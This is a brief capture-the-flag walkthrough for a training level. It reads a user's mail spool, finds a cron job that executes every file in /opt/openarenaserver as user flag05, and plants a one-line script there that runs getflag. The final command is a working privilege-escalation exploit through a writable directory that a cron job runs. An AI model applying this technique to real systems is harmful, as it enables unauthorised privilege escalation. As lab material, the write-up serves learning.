For this level, we were great by a message: "You have a new mail".

Normally, mails are located at either:
"/var/spool/mail/$USER" or "/var/mail/$USER"

"cat /var/spool/mail/level05" result: "*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05"

We can see that it's a cronjob schedule. "*/2" in the beginning of the cronjob means that this job will be run every 2minutes. The following "*" means the job will be run every hour/day etc..

Next, we can see that the cronjob will run: "su -c "sh /usr/sbin/openarenaserver" - flag05"
It means that it will run "sh /usr/sbin/openarenaserver" as user flag05.

Let's check the executable:
"cat /usr/sbin/openarenaserver" result: "#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done"

This script will run every file in "/opt/openarenaserver/" then remove it.

So we can write our own script and put it into "/opt/openarenaserver/" and wait 2 minutes to let the cronjob do the task.

`echo "/bin/getflag > /tmp/exploit_result" > /opt/openarenaserver/exploit_script`
